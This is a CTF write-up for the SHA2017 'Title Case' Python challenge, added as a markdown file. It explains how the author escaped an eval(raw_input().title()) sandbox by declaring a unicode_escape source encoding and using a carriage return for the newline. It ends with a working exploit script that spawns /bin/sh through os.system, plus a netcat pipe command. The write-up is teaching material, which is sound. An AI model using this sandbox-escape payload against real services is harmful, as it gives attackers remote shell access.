@@ -1,0 +1,134 @@
+# Writeup for the `Title Case` chall from the SHA2017 CTF
+
+It's been a long time since the last writeup I did on this website. Let's remedy thi. The last week-end we played the SHA2017 CTF which was freaking awesome! One of the best CTF of the year in my opinion.
+
+We ended up at the 12th position, which is quite a good score for us :) And I did **2 PWNs**! (That's pretty uncommon) Here is the first one (solved 7 times).
+
+**Keywords**: Python, eval, encoding
+
+**Category**: PWN
+
+**Points**: 200
+
+> How Annoying
+
+> ```nc titlecase.stillhackinganyway.nl 1337```
+
+With the following code source linked:
+
+```python
+#!/usr/bin/env python
+eval(raw_input().title())
+```
+
+Wow fu*k! That's a pretty concise PWN! I'm really bad at reversing binaries so I'm so glad it is a Python PWN :D
+
+## Context
+
+If you aren't new to python you must know that the `raw_input()` function read the input of the user, up to the first `\n`. And this input gets eval-ed! How handy! They just gave us a easy shell right?
+
+I didn't know what was the `title()` function doing so I just tested this simple payload:
+
+```
+__import__("os").system("ls -la")
+```
+
+and got this error:
+
+```NameError: name '__Import__' is not defined```
+
+After reading the docs, we learn that `title()` transform every string in a "Title Case" string which means that our payload got replaced by:
+
+```
+__Import__("Os").System("Ls -La")
+```
+
+Mmh that's annowing.. But we should easily get around it.. Right?
+
+# Failing, again, and again
+
+Easy! We just need to find some weird python functions that start with a capital letter, it shouldn't be that hard.
+
+We realized pretty fast that we could build strings easily, for example if I want to build the string: "hello you!", I jst need to do:
+
+```python
+print "ah"[1] + "hello "[1:] + "oy"[1] + "you!"[1:]
+```
+
+Now let's find a function that can evaluate a string. So we listed every functions/object in `dir()` that meet:
+
+```
+name_function == name_function.title()
+```
+
+And we got some... But nothing useful.
+
+Mmh we might need to think out side the box.
+
+## Illumination
+
+After looking at the ceiling for a good 20min, something came to my mind. A month ago I was at the biggest french security event in Paris (la nuit du hack) and I played the public wargame. I remembered a chall coded by [@smeriot](https://twitter.com/smeriot) (which was pretty nice btw) in which he obfuscated a python file using (among other things) this funny trick:
+
+```python
+# -*- coding: rot13 -*-
+# The code goes here
+cevag "Hello there! You know how to decode rot13, well done."
+```
+
+(works in python2)
+
+What if there was other encodings that we could use? Something like mandarin, or hexadecimal? After some research we found the official docs:
+
+https://docs.python.org/2.4/lib/standard-encodings.html
+
+And we tested a script encoded in [unicode_escape](https://docs.python.org/2/howto/unicode.html):
+
+```python
+# -*- coding: unicode_escape -*-
+\160\162\151\156\164 666
+```
+
+(which does: `print 666`) The script is working! But then when we try to run `eval(script.title())` it throws as if the encoding didn't work. After some testing it appears that the line that is declaring the encoding is case sensitive. Then we looked for the documentation and found:
+
+https://www.python.org/dev/peps/pep-0263/
+
+Perfect! We can use this:
+
+```python
+# Encoding: unicode_escape
+\160\162\151\156\164 666
+```
+
+Then we crafted our little exploit, and send it to the server without testing it, too proud. And it failed.
+
+What we forgot is what I told you in the very beginning of this writeup:
+
+> If you aren't new to python you must know that the `raw_input()` function read the input of the user, up to the first `\n`.
+
+So our payload can't have any `\n`! Shit!
+
+# The final trick
+
+At this point we didn't know what to do, we started to go back and to look a bit more into the `dir()`.. It was a really hard chall!
+
+Then I tried one hopeless attempt: replacing the `\n` by a `\r` (which would more or less work on windows, and as python is multi-platform, maybe that...) And it worked!!!
+
+So here is the final exploit:
+
+```python
+def unicode_escape(s):
+    res = ''
+    for c in s:
+        res += '\\'+oct(ord(c)).lstrip("0").zfill(3)
+    return res
+
+payload = '__import__("os").system("/bin/sh")'
+payload = unicode_escape(payload)
+print("# Encoding: Unicode_Escape \r" + payload)
+```
+
+And then ran:
+
+`python3 exploit.py | nc domain port`
+
+And here we are! probably the shortest pwn exploit ever :p
